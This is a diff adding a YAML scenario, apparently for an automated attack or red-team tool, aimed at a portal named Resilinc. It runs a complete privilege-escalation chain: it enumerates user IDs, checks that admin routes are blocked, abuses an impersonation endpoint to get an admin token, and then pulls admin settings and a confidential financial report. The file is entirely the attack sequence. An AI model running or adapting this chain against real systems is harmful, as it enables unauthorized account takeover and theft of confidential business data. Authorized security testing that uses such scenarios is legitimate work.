@@ -1,0 +1,62 @@
+id: portal-resilinc-enum-escalate
+name: Enumerate & Escalate Privileges on Resilinc Portal
+mode: predator
+retry_on_failure: true
+
+steps:
+  - phase: reconnaissance
+    description: Enumerate authenticated user's accessible API endpoints to gather user IDs
+    action:
+      method: GET
+      path: /api/v1/users
+      headers:
+        Authorization: "Bearer {{auth_token}}"
+    extract:
+      path: $.data.users[*].id
+      save_as: user_ids
+
+  - phase: reconnaissance
+    description: Validate that admin endpoints are restricted for normal user (expect 403)
+    action:
+      method: GET
+      path: /api/v1/admin/users
+      headers:
+        Authorization: "Bearer {{auth_token}}"
+    validate:
+      status_code: 403
+
+  - phase: exploitation
+    description: Attempt privilege escalation via impersonation of the first user ID (target admin)
+    action:
+      method: POST
+      path: /api/v1/auth/impersonate
+      headers:
+        Authorization: "Bearer {{auth_token}}"
+        Content-Type: "application/json"
+      payload:
+        user_id: "{{user_ids[0]}}"
+    validate:
+      status_code: 200
+    extract:
+      path: $.data.token
+      save_as: admin_token
+
+  - phase: actions_on_objectives
+    description: Access admin-only settings endpoint using elevated token
+    action:
+      method: GET
+      path: /api/v1/admin/settings
+      headers:
+        Authorization: "Bearer {{admin_token}}"
+    validate:
+      status_code: 200
+
+  - phase: actions_on_objectives
+    description: Retrieve confidential financial report from admin endpoint
+    action:
+      method: GET
+      path: /api/v1/admin/reports/financial
+      headers:
+        Authorization: "Bearer {{admin_token}}"
+    validate:
+      status_code: 200
